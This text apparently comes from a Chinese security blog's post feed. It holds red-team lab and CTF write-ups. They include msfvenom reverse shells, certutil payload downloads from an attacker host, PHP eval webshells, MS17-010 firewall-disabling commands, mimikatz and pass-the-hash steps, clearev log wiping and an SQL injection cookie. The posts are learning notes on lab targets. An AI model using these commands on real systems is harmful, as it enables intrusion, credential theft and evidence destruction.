web打点进入weblogic页面后首先尝试弱口令weblogic/weblogic，登陆不进去，考虑使用weblogic扫描器。 通过扫描发现了CVE-2019-2725漏洞，尝试利用。 利用工具： https://github.com/TopScrew/CVE-2019-2725 这个脚本有个问题，明明import了sys，requests等，但是运行的时候还是会报没有import，很奇怪，把它放到if name=main里面就好了（这里大概率是name==main带来的执行顺序的问题） 顺利运行脚本后，即可获得一个webshell，地址为： http://192.168.111.128:7001/bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=ipconfig 先用webshell查看systeminfo,发现为64位操作系统，尝试使用msfvenom生成64位的reverse shell msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.111.129 lport=4444 a- x64 -f exe &gt;/root/Desktop/shell.exe kali启动apache服务，并将webshell放到/var/www/html目录下 利用Windows自带的工具 certutil下载webshell certutil.exe -urlcache -split -f http://192.168.111.129/shell.exe 但是不行，直接被360干掉了。 使用java反序列化终极测试工具直接上传冰蝎shell，目录为 1C:\\Oracle\\Middleware\\wlserver_10.3\\server\\lib\\consoleapp\\webapp\\framework\\skins\\wlsconsole\\images\\shell.jsp 可以直接连上~ 下面将shell反弹到msf上，进行下一步的渗透。 内网信息搜集在meterpreter里面使用run get_local_subnets 获取服务器网卡信息 看到10网段，添加10网段路由： run autoroute -s 10.10.10.0/24 然后启动socks代理 我这里对代理的理解是在msf启动socks5代理后，设置监听IP与端口，任何使用proxychains进行的动作都会转发到设置好的监听与端口上，与此同时msf设置了通往靶机内网的路由，便可将请求通过（命令）内网主机发送出去。 看一下net user /domain 发现了域内有五个用户 查询域控 1net group &quot;Domain Controllers&quot; &#x2F;domain 通过ipconfig /all查询IP地址与DNS服务器地址（一般DNS服务器地址是DC） 使用net config workstation 查询工作站情况 可以确定，当前域为de1ay.com 接下来使用ladon探测内网主机存活情况 利用失败，无回显，在虚拟机查看发现被360拦截掉了。 由于java的meterpreter没有mimikatz模块，所以这里尝试上传Windows的shell并且加载mimikatz模块。（忘记了之前生成的shell被干掉了。。没办法，尝试免杀） 使用go免杀cs成功了，成功上线 接下来尝试添加管理员用户 net user polosec admin@123 /add net localgroup Administrators polosec /add 由于360拦截 添加失败。 通过漏洞进行权限提升，拿到一个system权限的shell。 探测域内存活主机将cs会话派生给msf 首先CS新建一个foreign listener，选择https，记住设置的端口号和hsot。 msf一样的配置 注意这里一定要选reverse http 否则meterpreter会die 使用如下命令用ICMP协议探测主机存活： 12for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL&#x3D;&quot; 使用arp -a 查看arp缓存 确定主机大概为: 10.10.10.10(DC), 10.10.10.80, 10.10.10.201 目前10.10.10.80已经被拿下，下面尝试对10.10.10.10以及10.10.10.201主机进行渗透。 渗透域内主机通过PASS THE HASH 的方式传递NTLM hash实现上线DC和域内主机。 具体方法： 在CS中 view target -add 添加DC的IP，点击jump ，PS EXEC ，选择一个同域的账号密码进行PTH，即可顺利上线DC。 上线DC后再用mimikatz抓一下密码，然后利用同样的方法上线主机10.10.10.201。 顺利上线主机10.10.10.201： 总结通过本次对vulstack靶场的学习， 进一步了解了CS MSF的用法，加深了对bypass uac 、提权的认识，学习了初步的免杀技巧； 学会了在msf中如何配置路由对内网进行扫描，学习了几个常用的提权方式 比如MS14058 MS15051； 使用pth的方式上线域内主机等等。。 目前存在的问题也非常多，包括不太了解CS，CS的shell掉线不知道是什么问题，以及还有很多很多现在还没有学习到的知识。 针对当前问题的学习目标：了解PTH，掌握mimikatz的用法，了解如何bypass uac，认识更多的提权方法。","categories":[],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://polosec.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]},{"title":"vulstack 红队评估(一) 内网渗透","slug":"vulstack-红队评估-一-内网渗透","date":"2020-12-03T10:04:01.000Z","updated":"2020-12-03T10:07:03.355Z","comments":true,"path":"2020/12/03/vulstack-红队评估-一-内网渗透/","link":"","permalink":"https://polosec.github.io/2020/12/03/vulstack-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/","excerpt":"","text":"vulstack 红队评估（一）前言这是我第一次做内网渗透的相关内容，做一个学习记录。 准备工作下载镜像，虚拟机默认密码hongrisec@2019，登陆后有两台需要改密码，注意密码的格式。。别忘了再重装– 我的密码是 对网络的部署需要一定的计算机网络基础知识。 kali 网卡： NAT web服务器（DMZ区）： 网卡1 NAT 网卡2 VMNET1（hostonly） 内网服务器1（域控） 网卡 VMNET1 hostonly 内网服务器2 ： 网卡 VMNET1 hostonly 部署好后由于Windows7开了防火墙，可以向外ping但是ping不动该机器，用两台内网主机ping一下试试能不能ping动。 正常情况下 主机可以ping通两台内网主机，win7可以ping通两台内网主机，kali可以ping通win7。 web渗透工作开局phpstudy探针，猜一猜数据库账号密码root/root phpmyadmin默认路径，日进去尝试写日志getshell。 首先看看是否开日志了 SHOW VARIABLES LIKE ‘%general%’ 没开，开一下。 set golbal general_log=on; 设置下日志路径（探针中查看） 1set global general_log_file &#x3D;&#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;2.php&#39;; 接下来查询一下，内容是shell。 1select &#39;&lt;?php eval($_POST[a]); ?&gt;&#39;; 之后访问蚁剑链接shell就可以了 连上shell后whoami一下，发现是administrator权限，在GOD域下(?对域的概念还不太了解) 接下来使用msfvenom生成shell连接。 123456msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.54.2 lport&#x3D;5555 -f exe&gt;shell.exeuse exploit&#x2F;multi&#x2F;handler set payload windows&#x2F;meterpreter&#x2F;reverse_tcpset lhost 192.168.54.2set lport 5555exploit 在蚁剑执行exe文件即可获得反弹shell 不太会用msf，执行命令一直啥都没有，最后知道msf有一套自己的命令，输入shell后获得了靶机的shell。 12run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp启用RDP登录。 接下来尝试上传cs 的beacon。 cs首先设置listener，生成Windows的32位可执行程序 a.exe 通过msf的meterpreter上传到目标主机并执行 upload /root/Desktop/1.exe execute -f 1.exe 之后在cs可以看到服务器上线。 msf meterpreter 简介 Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。 最后,Meterpreter还可以简化任务创建多个会话。可以来利用这些会话进行渗透。在Metasploit Framework中，Meterpreter是一种后渗透工具，它属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型Payload。这种工具是基于“内存DLL注入”理念实现的，它能够通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。其中，攻击者与目标设备中Meterpreter的通信是通过Stager套接字实现的meterpreter作为后渗透模块有多种类型，并且命令由核心命令和扩展库命令组成，极大的丰富了攻击方式。 需要说明的meterpreter在漏洞利用成功后会发送第二阶段的代码和meterpreter服务器dll，所以在网络不稳定的情况下经常出现没有可执行命令，或者会话建立执行help之后发现缺少命令。 连上vpn又在内网中使用psexec和bind_tcp的时候经常会出现这种情况 内网信息搜集在cs中尝试使用mimikatz获取登录的用户名和密码 使用ladon扫描内网 得到结果： 192.168.52.3 139 445 3389 192.168.52.138 80 445 139 389 192.168.52.141 21 139 192.168.52.138主机389端口开启了LDAP服务，可能是DC。 下面尝试添加路由，使用Windows7作为跳板机访问Windows2003 经尝试后可以ping通，可以顺利访问。 渗透域内成员141使用nmap对目标主机进行扫描，尝试扫描SMB漏洞 发现漏洞，尝试利用 成功获取目标机器的shell。 load mimikatz mimikatz_command -f samdump::hashes 获取主机的密码，这样就成功抓到了主机的用户名和NTML-hash值。 渗透域控使用nmap对目标ip进行扫描，发现MS17-010和MS08-067漏洞，这次尝试利用MS17-010进行攻击。 首先关闭防火墙 1234use auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_commandset rhosts 192.168.52.138set command &quot;netsh advfirewall set allprofiles state off&quot;exploit 接下来获得一个正向shell 1234use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexecset rhosts 192.168.52.138set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcpexploit 之后我用mimikatz抓密码出了点问题，报错mod_process::getVeryBasicModulesListForProcess : (0x0000012b) 搜了搜这个问题是因为mimikatz默认加载32位系统，但是我们的系统是64位的，所以首先要将meterpreter迁移到一个64位进程上。 PS一下，选择权限为NT AUTHORITY\\SYSTEM权限的进程 migrate pid 即可。 之后在用mimikatz抓密码就能抓到了。 攻击结束后使用clearev命令清除攻击痕迹。 总结第一次完整地做内网渗透相关的练习，对内网渗透的过程不太熟悉，工具的使用也不熟悉，对一些概念性的基础问题也不太熟悉。。。希望能在后续的学习过程中不断完善这些方面。 参考链接https://shavchen.github.io/vulstack-1-writeup/#%E6%B8%97%E9%80%8F%E5%9F%9F%E6%8E%A7 https://www.freebuf.com/column/230476.html https://www.cnblogs.com/wkzb/p/12358076.html#scroller-14","categories":[],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://polosec.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]},{"title":"comprehensive traffic analysis","slug":"comprehensive-traffic-analysis","date":"2020-11-30T07:58:16.000Z","updated":"2020-11-30T07:59:52.327Z","comments":true,"path":"2020/11/30/comprehensive-traffic-analysis/","link":"","permalink":"https://polosec.github.io/2020/11/30/comprehensive-traffic-analysis/","excerpt":"","text":"题目2019.8 安恒流量分析 某公司内网网络被黑客渗透，请分析流量，给出黑客使用的扫描器 某公司内网网络被黑客渗透，请分析流量，得到黑客扫描到的登陆后台是(相对路径即可) 某公司内网网络被黑客渗透，请分析流量，得到黑客使用了什么账号密码登陆了web后台(形式:username/password) 某公司内网网络被黑客渗透，请分析流量，得到黑客上传的webshell文件名是，内容是什么,提交webshell内容的base编码 某公司内网网络被黑客渗透，请分析流量，黑客在robots.txt中找到的flag是什么 某公司内网网络被黑客渗透，请分析流量，黑客找到的数据库密码是多少 某公司内网网络被黑客渗透，请分析流量，黑客在数据库中找到的hash_code是什么 某公司内网网络被黑客渗透，请分析流量，黑客破解了账号&#105;&#x6a;&#x6e;&#x75;&#64;&#116;&#101;&#x73;&#116;&#x2e;&#x63;&#x6f;&#109;得到的密码是什么 某公司内网网络被黑客渗透，请分析流量，被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip 某公司内网网络被黑客渗透，请分析流量，黑客使用了什么账号登陆了mail系统（形式: username/password） 某公司内网网络被黑客渗透，请分析流量，黑客获得的vpn的ip是少 题目分析1.观察12281号包，看HTTP层的referrer，发现了AWVS的扫描器特征。 2.过滤http协议，发现/admin/login.php 3.过滤http协议，看86号包，发现了表单数据 username 人事 password hr123456（错误答案） 302跳转代表登陆成功 使用http contains “rec=login” and http.request.method==POST and ip.src==192.168.94.59 语句对webone进行过滤，将结果对时间进行排序，发现最后一个包中的username admin password admin!@#pass123 4.a.php 翻到最后发现了a.php 然后分组列表搜a.php 找POST包 Form item: “action” = “QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJb 使用 http contains “&lt;?php @eval” 过滤找一句话木马，但是没找到。 考虑TCP 重传可能导致http没追踪到，所以考虑使用tcp contains “&lt;?php @eval” 发现了 1&lt;?php @eval($_POST[1234]);?&gt; 将其base64encode即可。 1PD9waHAgQGV2YWwoJF9QT1NUWzEyMzRdKTs&#x2F;Pg&#x3D;&#x3D; 5.搜字符串robots.txt 发现flag flag:87b7cb79481f317bde90c116cf36084b 6.找到webshell的名称后，一直跟踪webshell，看看她在做什么。数据包大概在734581。 后面会发现查看了数据库配置文件，就发现了数据库账号密码 dbuser web dbpass e667jUPvJjXHvEUv 7.在web2数据包中 过滤mysql协议 分组字节流搜索字符串hash_code 看response包发现hash_code d1c029893df40cb0f47bcf8f1c3c17ac 8.web2数据包中 过滤mysql协议 搜索字符串 &#105;&#106;&#x6e;&#x75;&#x40;&#116;&#101;&#x73;&#x74;&#46;&#x63;&#x6f;&#x6d; ，看到md5加密的密码b78f5aa6e1606f07def6e839121a22ec，解密一下得到edc123!@# 9.追踪webshell包，发现了ifconfig命令。 -&gt;|eth0 Link encap:Ethernet HWaddr 00:0C:29:CB:9F:85 \\n ​ inet addr:192.168.32.189 Bcast:192.168.32.255 Mask:255.255.255.0\\n 10.打开mailtwo数据包，过滤http流，发现第一个数据包里面的动作是登出，发现了用户名wenwenni。 然后看28号数据包的操作是访问登录页面，35号数据包发现了密码加密函数。 是AES-CBC加密，key为1234567812345678。 继续看42 44数据包，还是wenwenni用户登录，并且返回了 success true. 尝试使用如下过滤器过滤: 1(http contains &quot;&#123;\\&quot;success\\&quot;:true&#125;&quot; or http.request.method&#x3D;&#x3D;&quot;POST&quot;) and ip.addr&#x3D;&#x3D;192.168.94.59 发现到最后也没爆破成功（这题看的别人的思路，我没懂） 然后打开mailto1 继续使用上述语句过滤 发现18512登陆成功，则密码在17126号数据包中。+ZgE14UGcFcyRGLI0/ZXPQ== 密码为1234567812345678的MD5值，偏移量为1234567812345678 AES解密得admin!@#PASS123 11.第一个vpn数据包在尝试登录vpn，然后看第二个。 统计一下会话信息，发现10.3.4.3 10.3.4.96 10.3.4.55 这几个ip之间的通信较多，然后过滤看看。 过滤一下smb协议，发现10.3.4.96是SMB服务器。 然后在看一下55这个ip ip.addr==10.3.4.55 发现10.3.4.3首先ping了10.3.4.55 所以确定10.3.4.3是黑客使用的vpn服务器。 总结对一些有手就行的过滤方法用的还可以，但是深入一点就不太行了 对一些流量动作的分析不太到位，对filter的用法也不太熟悉，比如\\表转义。继续学习！ 待学习：PPTP协议、SMB协议参考https://blog.csdn.net/qq_43431158/article/details/107176918","categories":[],"tags":[]},{"title":"安洵杯misc全wp","slug":"安洵杯misc全wp","date":"2020-11-26T09:42:26.000Z","updated":"2020-11-26T09:42:44.965Z","comments":true,"path":"2020/11/26/安洵杯misc全wp/","link":"","permalink":"https://polosec.github.io/2020/11/26/%E5%AE%89%E6%B4%B5%E6%9D%AFmisc%E5%85%A8wp/","excerpt":"","text":"密码学 爆破SECRET是不知道的 flag是md5(SECRET).hexdigest() 已知部分flag为 1d0g3&#123;71b2b5616**2a4639**7d979**de964c&#125; cipher是sha256加密后的flag，其摘要为 0596d989a2938e16bcc5d6f89ce709ad9f64d36316ab80408cb6b89b3d7f064a 现在不知道secret。 str1=”71b2b5616” str2=”2a4639” str3=”7d979” str4=”de964c” str1 2 3 4 之间分别有两位不知道 爆破的话需要爆破16^6次。 直接爆破 12345678910111213141516171819import hashlibbroken_flag= &#x27;71b2b5616**2a4639**7d979**de964c&#x27;str1=&quot;d0g3&#123;71b2b5616&quot;str2=&quot;2a4639&quot;str3=&quot;7d979&quot;str4=&quot;de964c&#125;&quot;cipher=&#x27;0596d989a2938e16bcc5d6f89ce709ad9f64d36316ab80408cb6b89b3d7f064a&#x27;def getdigest(content): return hashlib.sha256(content).hexdigest()alphabet=&quot;1234567890abcdef&quot;for a in alphabet: for b in alphabet: for c in alphabet: for d in alphabet: for e in alphabet: for f in alphabet: string=str1+a+b+str2+c+d+str3+e+f+str4 if getdigest(string)==cipher: print string misc签到扫码套娃，然后得到一个flag.docx，里面一串乱码，而且公众号也提示了不是emojidecode，但是这玩意除了emojidecode还能是啥？ 因为我的word2016无法显示emoji，然后我换成rar解压，在xml里面看到了emoji，放到在线解密工具即可。（师傅们直接复制过去就完事了） 王牌特工这道题一开始没啥思路，然后file看一下是ext3格式。网上搜了一篇教程就差不多出来了。 https://blog.ihomura.cn/2018/08/03/WriteUp-ext3-%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D-HZ-file/ 工具：fsstat，ext3grep，veracrypt。 装ext3grep的时候，报错了按照网上说的做增添一些东西，我这还会报错，把最后报错的那一行注释掉就完事儿了。 首先使用fsstat看镜像信息。 fsstat findme 其中root directory比较重要（我也不知道为什么） 接下来使用ext3grep查看文件信息。 ext3grep –inode 2 findme 恢复这个东西 ext3grep –restore-file .coolboy.swp findme vim -r .coolboy.swp 新建一个目录/root/coolboy 恢复完会放到这里面，base64解码后的内容为： 1真的密码:this_is_a_true_key 用这个密码使用veracrypt去挂载flagbox，就可以获得flag。 misc3一开始是hardzip，有个密码1，看文件比较短尝试CRC32爆破，爆破完的密码拼起来就是easyzip的解压密码。 解压下来easyzip， 通过伪加密拿到redeme.txt，尝试明文攻击。 这里需要注意的是，使用明文攻击需要保证待破解压缩包里只有一个文件，也就是已知文件。因为这里面有一个伪加密，其他文件的压缩算法可能与已知文件的不一致，所以为了保证顺利进行，需要将其他文件删除（这道题所需要，其他情况下如果加密方式都一样的话就不用删除。） misc4npmtxt打开一看啥也不懂，010editor打开一看有看不懂的东西，搜了搜16进制慢慢搜就搜到了0宽隐写。 把那一串复制到https://yuanfux.github.io/zero-width-web/ decode就可以获得解压密码 RealV1siBle 打开是张图，silenteye一把梭出来flag。 总结这次比赛觉得web比较难，ssti没做出来比较上心。最近打算深度学习ssti相关内容，争取下次做出来！","categories":[],"tags":[]},{"title":"山东省新一代攻防赛wp","slug":"山东省新一代攻防赛wp","date":"2020-11-23T14:01:58.000Z","updated":"2020-11-26T09:53:35.018Z","comments":true,"path":"2020/11/23/山东省新一代攻防赛wp/","link":"","permalink":"https://polosec.github.io/2020/11/23/%E5%B1%B1%E4%B8%9C%E7%9C%81%E6%96%B0%E4%B8%80%E4%BB%A3%E6%94%BB%E9%98%B2%E8%B5%9Bwp/","excerpt":"","text":"前言打聊城的比赛，又白给了，拿了参与奖，做出来两个misc，剩下两个misc都做了快一半，没思路了，特来复现。 webweb1打开之后是一个登陆页面，查看源码发现了测试账号test/test 查看robots.txt 发现php.php 发现是phpinfo。 登录之后发现可能存在LFI，然后上了下扫描器，扫到了一些文件，尝试包含info.php，得到源码，然后发现了include了template/info.html，于是访问。查看源码发现了hint m4nageee.php。然后读manage的源码，在源码中发现包含了2333.html，于是访问。 查看源码时发现了php代码，尝试PHP session文件包含。 但是需要session的存放位置，于是通过扫描到的php.php查看session日志的存放位置/var/lib/php5，遂包含之。 在m4nageee里面写nickname到session文件里面，利用LFI包含getshell。 当前我的phpsessid为0u335c2ud2h9gjq0lq6nos1i72 所以session文件就是/var/lib/php5/sess_0u335c2ud2h9gjq0lq6nos1i72,包含即可。 nikename里面写 12345678 &lt;?php system(&quot;cat fla*&quot;)； ?&gt; 即可绕过对flag的过滤或者这样写&lt;?php system(&quot;cat fl\\ag_0ba7bc92fcd57e337ebb9e74308c811f&quot;); ?&gt;等等。。 web2 web3题目提示使用sqlmap注入，但是我注入巨拉跨。。而且数据库是sqlite的，我只会一点mysql的注入。。当时没做出来，赛后复现下。 这题是使用cookie注入。我明确地知道自己不会用sqlmap进行cookie注入。 不会 跟官方的思路没复现出来，等wp。这里放下济大师傅的web2 web3的payload： Cookie: PHPSESSID=da55nb2kgsge2luvc5m53k5r90; username=test; password=test’ OR 1=1 LIMIT 1 OFFSET 1 – password=test’ OR 1=1 LIMIT 1 OFFSET 1 – ; userinfo=eyJ1c2VybmFtZSI6InRlc3QiLCJwYXNzd29yZCI6InRlc3QnIE9SIDE9MSBMSU1JVCAxIE9GRlNFVCAxIC0tICJ9Cg%3D%3D miscez_decode简单的编码转换： 1&amp;#54;&amp;#54;&amp;#54;&amp;#99;&amp;#54;&amp;#49;&amp;#54;&amp;#55;&amp;#55;&amp;#98;&amp;#54;&amp;#54;&amp;#51;&amp;#57;&amp;#54;&amp;#52;&amp;#54;&amp;#54;&amp;#51;&amp;#53;&amp;#51;&amp;#52;&amp;#51;&amp;#48;&amp;#51;&amp;#49;&amp;#51;&amp;#48;&amp;#51;&amp;#48;&amp;#51;&amp;#56;&amp;#51;&amp;#51;&amp;#54;&amp;#50;&amp;#51;&amp;#48;&amp;#54;&amp;#54;&amp;#51;&amp;#49;&amp;#54;&amp;#54;&amp;#51;&amp;#50;&amp;#51;&amp;#51;&amp;#54;&amp;#49;&amp;#51;&amp;#51;&amp;#54;&amp;#53;&amp;#54;&amp;#49;&amp;#54;&amp;#53;&amp;#54;&amp;#51;&amp;#54;&amp;#51;&amp;#51;&amp;#53;&amp;#54;&amp;#52;&amp;#51;&amp;#53;&amp;#54;&amp;#49;&amp;#51;&amp;#55;&amp;#54;&amp;#51;&amp;#55;&amp;#100; html实体编码-&gt;hexo2string-&gt;flag flag{f9df54010083b0f1f23a3eaecc5d5a7c} qr_code: 打开很多二维码，盲猜扫出来内容转0和1 比赛的时候有个简单的读二维码的工具，但是批量不会写脚本。。就读了两个，看哪个是0哪个是1，然后bin2ascii就可以了。 用脚本的做法： 1234567891011121314151617181920212223242526272829# -*-coding:utf8 -*-import osimport zxingimport binasciiimport base64reader=zxing.BarCodeReader()asc=&#x27;&#x27;path=&quot;C:\\\\Users\\\\Administrator\\\\Desktop\\\\聊城\\\\qrcode&quot;files=os.listdir(path)for i in range (0,len(files)-1): # try: # content=reader.decode(file).raw # if content==&quot;zero&quot;: # asc+=str(0) #这是识别二维码的方法 # if content==&quot;one&quot;: # asc+=str(1) # except: # pass size=os.path.getsize(str(i)+&quot;.png&quot;) #这是使用filesize做的方法 if size==3409: asc+=&#x27;0&#x27; else: asc+=&#x27;1&#x27;asc=int(asc,base=2)print(asc)asc=hex(asc)asc=asc[2:]print(binascii.a2b_hex(asc).decode()) flag{duyoulikeit} relax打开是个.flag结尾的文件，丢进010editor看见是PK开头，考虑zip，解压出来一个flag.txt 一个音频。 flagtxt里面的base64解出来啥也不是，于是继续看音频。 考虑音频隐写，在文件详细信息里面发现了一串base64,解码后打开mp3stego，输入这个密码，得到了一串fakeflag： fakeflag{same_length_with_true_flaghh} 和真的长的一样呢，真真假假 后面就没思路了。 后来看师傅的wp说需要讲该字符串与之前解出来啥也不是的base64异或就可以得到flag。草。 上脚本： 12345678910import base64with open(&quot;flag.txt&quot;) as f: str1=f.readline()str1=base64.b64decode(str1)fakeflag=&quot;fakeflag&#123;same_length_with_true_flaghh&#125;&quot;.encode()flag=&quot;&quot;for i in range (len(fakeflag)): tmp=fakeflag[i]^str1[i] flag+=chr(tmp)print( flag) 这里需要注意的是：encode()方法是str类型提供的，将其转换为byte类型。decode（）方法是将byte类型转化为str类型。之前我都是出错了就直接瞎encode，decode，咋对咋弄。。今天终于知道了。 flag：flag{9ff3a239027a7089237686b384862d33} base64base64套娃，光想着basecrack，结果直接卡死。。就是没想起来自己写脚本。 附上hxd的脚本 1234567891011121314151617181920212223242526272829import base64with open (&quot;base.txt&quot;,&quot;rb&quot;) as f: content=f.read()while True: try: content=base64.b16decode(content).decode() print(&quot;b16&quot;) print(content) except: try: content=base64.b32decode(content).decode() print(&quot;b32&quot;) print(content) except: try: content=base64.b64decode(content).decode() print(&quot;b64&quot;) print(content) except: try: content=base64.b85decode(content).decode() print(&quot;b85&quot;) print(content) except: break; flag:flag{4b057431c3ee0c4f56d4dad18c352375}","categories":[],"tags":[]},{"title":"取证专题","slug":"取证专题","date":"2020-11-17T03:49:09.000Z","updated":"2020-11-17T04:32:36.606Z","comments":true,"path":"2020/11/17/取证专题/","link":"","permalink":"https://polosec.github.io/2020/11/17/%E5%8F%96%E8%AF%81%E4%B8%93%E9%A2%98/","excerpt":"","text":"取证需要用到的工具： volatility、注册表分析工具（WRR）、AXIOM等。 例题分析湖湘杯misc首先看一下imageinfo 1volatility -f 用户名注册表.vmem imageinfo 选择一个supported profile，这里选第一个不行，所以选第二个Win2003SP2x86 先扫一下pslist volatility -f 用户名注册表.vmem –profile=Win2003SP2x86 pslist 除了winlogon.exe之外没啥收获，然后扫一下网络，也没啥收获。 后面尝试扫描connscan，cmdscan，notepad。 在扫notepad的时候发现了一些东西，于是尝试扫一下后缀为.txt的文件，看看有没有收获。 发现了一个file.txt，尝试dump到本地。 1volatility -f 用户名注册表.vmem --profile&#x3D;Win2003SP2x86 dumpfiles -Q 0x000000000412cde0 -D .&#x2F; dump下来的文件内容为 什么？计算机又被不知名账户登录了？明明在计算机管理中没有这个用户，为什么还会被这个用户登录呢？电脑跟前的你能帮我找到原因吗？flag为该用户的用户名以及密码的md5值。 格式：md5(用户名:密码） 下面考虑在注册表中找一下隐藏用户。 首先看一下注册表。 1volatility -f 用户名注册表.vmem --profile&#x3D;Win2003SP2x86 hivelist volatility -f 用户名注册表.vmem --profile&#x3D;Win2003SP2x86 hivelist 发现了SAM表。SAM表是存储了电脑登录用户相关信息的表，尝试dump出SAM表。 1volatility -f 用户名注册表.vmem --profile&#x3D;Win2003SP2x86 dumpregistry -D .&#x2F; 然后使用注册表分析工具打开。 可以看到很多隐藏账户，一个个看看是否有last logon 这个属性。 最后找到了用户 FHREhpe，然后再回到volatility里面hashdump 出来关于他的账号密码。 123volatility -f 用户名注册表.vmem --profile&#x3D;Win2003SP2x86 hashdump | grep FHREhpe有如下数据：FHREhpe$:1171:70fdb8f853bd427d7584248b8d2c9f9e:f3cf477fc3ea6ec0b3b5887616dd4506::: Windows系统下的hash密码格式为：用户名称*:RID:LM-HASH值:NT-HASH*值 获得NT HASH值后可以去md5网站解密，解密后的密码是NIAIWOMA 然后将其MD5加密后即可获得flag。 参考链接https://bbs.ichunqiu.com/thread-59102-1-1.html https://www.sqlsec.com/2019/11/winhash.html","categories":[],"tags":[{"name":"取证","slug":"取证","permalink":"https://polosec.github.io/tags/%E5%8F%96%E8%AF%81/"}]},{"title":"1104学习笔记","slug":"1104学习笔记","date":"2020-11-09T08:52:34.000Z","updated":"2020-11-09T08:54:26.221Z","comments":true,"path":"2020/11/09/1104学习笔记/","link":"","permalink":"https://polosec.github.io/2020/11/09/1104%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"python文件反编译103F30D0A79CB05586300000000000000000100000040000000730D0000006400008400005A000064010053280200000063000000000300000016000000430000007378000000640100640200640300640400640500640600640700640300640800640900640A00640600640B00640A00640700640800640C00640C00640D00640E00640900640F006716007D00006410007D0100781E007C0000445D16007D02007C01007400007C0200830100377D0100715500577C010047486400005328110000004E6966000000696C00000069610000006967000000697B000000693300000069380000006935000000693700000069300000006932000000693400000069310000006965000000697D000000740000000028010000007403000000636872280300000074030000007374727404000000666C6167740100000069280000000028000000007304000000312E7079520300000001000000730A0000000001480106010D0114014E280100000052030000002800000000280000000028000000007304000000312E707974080000003C6D6F64756C653E010000007300000000 使用010editor编辑，paste from hex，然后另存为1.pyc。python安装uncompyle , pip install uncompyle下面就是 uncompyle 1.pyc&gt;1.py 123456789def flag(): str = [ 102, 108, 97, 103, 123, 51, 56, 97, 53, 55, 48, 51, 50, 48, 56, 53, 52, 52, 49, 101, 55, 125] flag = &#x27;&#x27; for i in str: flag += chr(i) print flagflag() 运行即可获得flag base64隐写解密脚本 1234567891011121314151617181920212223242526272829303132333435def get_base64_diff_value(s1, s2): base64chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27; res = 0 for i in xrange(len(s2)): if s1[i] != s2[i]: return abs(base64chars.index(s1[i]) - base64chars.index(s2[i])) return resdef solve_stego(): with open(&#x27;1.txt&#x27;, &#x27;rb&#x27;) as f: file_lines = f.readlines() bin_str = &#x27;&#x27; for line in file_lines: steg_line = line.replace(&#x27;\\n&#x27;, &#x27;&#x27;) norm_line = line.replace(&#x27;\\n&#x27;, &#x27;&#x27;).decode(&#x27;base64&#x27;).encode(&#x27;base64&#x27;).replace(&#x27;\\n&#x27;, &#x27;&#x27;) diff = get_base64_diff_value(steg_line, norm_line) print diff pads_num = steg_line.count(&#x27;=&#x27;) if diff: bin_str += bin(diff)[2:].zfill(pads_num * 2) else: bin_str += &#x27;0&#x27; * pads_num * 2 print goflag(bin_str)def goflag(bin_str): res_str = &#x27;&#x27; for i in xrange(0, len(bin_str), 8): res_str += chr(int(bin_str[i:i + 8], 2)) return res_strif __name__ == &#x27;__main__&#x27;: solve_stego() 直接输入base64隐写后的内容即可","categories":[],"tags":[]},{"title":"反序列化专题","slug":"反序列化专题","date":"2020-11-03T11:54:08.000Z","updated":"2020-11-09T08:51:56.266Z","comments":true,"path":"2020/11/03/反序列化专题/","link":"","permalink":"https://polosec.github.io/2020/11/03/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E9%A2%98/","excerpt":"","text":"最近对反序列化产生了一些兴趣，所以开此篇内容记录所遇到的反序列化的问题。安洵杯 easy_serialize_php题目代码： 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$function &#x3D; @$_GET[&#39;f&#39;];function filter($img)&#123; $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;); $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;; return 